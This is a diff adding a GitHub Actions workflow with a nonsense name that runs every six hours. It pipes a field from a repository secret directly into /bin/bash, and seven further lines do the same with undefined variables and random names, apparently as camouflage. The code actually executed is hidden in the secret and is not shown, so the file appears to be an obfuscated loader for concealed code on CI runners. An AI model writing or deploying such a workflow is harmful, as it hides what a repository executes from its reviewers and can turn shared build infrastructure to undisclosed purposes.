@@ -1,0 +1,25 @@
+name: chngaeruy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chngaeruy
+        env:
+          qdh4: ${{ secrets.qdh4 }}
+        run: |
+          echo $qdh4 | jq -r .qw7 | /bin/bash
+          echo $yeiz26667 | jq -r .yacc627 | /bin/bash
+          echo $ojl92933 | jq -r .g1997 | /bin/bash
+          echo $rq2 | jq -r .zryex1 | /bin/bash
+          echo $v34340 | jq -r .t2 | /bin/bash
+          echo $pfiw658 | jq -r .fraj7 | /bin/bash
+          echo $cy293 | jq -r .xzsg816 | /bin/bash
+          echo $nywmf4327 | jq -r .vfhhe77768 | /bin/bash
+
